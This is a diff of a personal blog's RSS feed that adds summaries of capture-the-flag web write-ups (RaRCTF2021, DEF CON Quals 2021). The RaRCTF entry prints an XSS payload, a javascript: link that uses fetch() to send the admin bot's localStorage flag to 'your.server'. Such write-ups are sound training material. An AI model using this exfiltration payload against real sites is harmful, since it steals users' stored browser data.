@@ -6,7 +6,29 @@
     <description>Recent content in writeups on Jam ⇆ Vie</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 04 Apr 2021 03:12:16 -0600</lastBuildDate><atom:link href="https://jamvie.net/categories/writeups/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Mon, 09 Aug 2021 13:49:21 -0700</lastBuildDate><atom:link href="https://jamvie.net/categories/writeups/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>RaRCTF2021: Some simpler web probz</title>
+      <link>https://jamvie.net/posts/2021/08/rarctf2021-some-simpler-web-probz/</link>
+      <pubDate>Mon, 09 Aug 2021 13:49:21 -0700</pubDate>
+      
+      <guid>https://jamvie.net/posts/2021/08/rarctf2021-some-simpler-web-probz/</guid>
+      <description>Fancy Button Generator // FBG A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you&amp;rsquo;re stealing admin&amp;rsquo;s localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode.
+Insert as your payload:
+title: eh link: javascript:fetch(&#39;your.server?fleg=&#39;%2B(window.localStorage.getItem(&amp;quot;flag&amp;quot;))); And report to admin. Careful with the wait times&amp;hellip;
+NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure.</description>
+    </item>
+    
+    <item>
+      <title>DEF CON Quals 2021: Getting Gud &#43; threefactooorx</title>
+      <link>https://jamvie.net/posts/2021/04/def-con-quals-2021-getting-gud-threefactooorx/</link>
+      <pubDate>Sun, 11 Apr 2021 00:07:54 -0600</pubDate>
+      
+      <guid>https://jamvie.net/posts/2021/04/def-con-quals-2021-getting-gud-threefactooorx/</guid>
+      <description>AKA - How I spent some time reading custom partially-deobfuscated javascript code and actually used the Chrome debugger for once
+DEF CON - undoubtedly the most notorious, famous and recgonized CTF out there. Even people who don&amp;rsquo;t do hacking know about DEF CON. The qualifiers, an event that took place this last weekend, ran for roughly 2 days and had 1 web challenge - which was more like reversing, but I&amp;rsquo;ll take what I can get.</description>
+    </item>
+    
     <item>
       <title>Bo1lersCTF 2021: Lorem_Ipsum</title>
       <link>https://jamvie.net/posts/2021/04/bo1lersctf-2021-lorem_ipsum/</link>
@@ -26,7 +48,7 @@ This is a Werkzeug debugger! What fun, since Werkzeug in development mode will g
       <guid>https://jamvie.net/posts/2021/03/utctf-2021/</guid>
       <description>Lightning Round The first few web challenges were pretty trivial so I&amp;rsquo;ll do super quick, 2-sentence descriptions on how to solve them.
 Source it! Inspect source. You&amp;rsquo;ll find it.
-Oinker Make an oink with the exact same content and realize that each oink has an allocated place in the webpage&amp;rsquo;s directory. (Example - inputting alert(1)l leads to oink endpoint 64). Go to \oink\2 to get the flag.
+Oinker Make an oink with the exact same content and realize that each oink has an allocated place in the webpage&amp;rsquo;s directory. (Example - inputting alert(1); leads to oink endpoint 64). Go to \oink\2 to get the flag.
 Fastfox (easy way) Intended (hard) solution was escalating a JIT bug, which I will definitely research more of so expect part 2 ;) but the easy way was determining what functions were available in the scope of Bob&amp;rsquo;s jsshell.</description>
     </item>
     
